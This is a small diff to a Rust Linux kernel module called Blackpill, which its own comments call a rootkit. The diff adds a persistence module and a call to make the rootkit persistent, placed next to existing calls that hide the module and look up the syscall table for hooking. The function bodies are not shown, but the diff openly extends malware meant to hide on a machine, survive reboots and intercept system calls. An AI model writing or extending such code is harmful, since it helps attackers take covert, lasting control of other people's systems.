@@ -4,6 +4,7 @@
 pub(crate) mod hiding;
 pub(crate) mod hooking;
 pub(crate) mod hypervisor;
+pub(crate) mod persistence;
 #[macro_use]
 pub(crate) mod utils;
 pub(crate) mod xdp;
@@ -25,8 +26,13 @@ impl kernel::Module for Blackpill {
     fn init(module: &'static ThisModule) -> Result<Self> {
         pr_info!("Starting\n");
 
+        // Hide rootkit
         hiding::hide(module);
 
+        // Make it persistent
+        persistence::persist();
+
+        // Get syscall table address
         let syscall_table: Option<*mut *mut u64> = hooking::get_syscall_table();
         pr_info!("Syscall table address = {:?}", syscall_table);
 
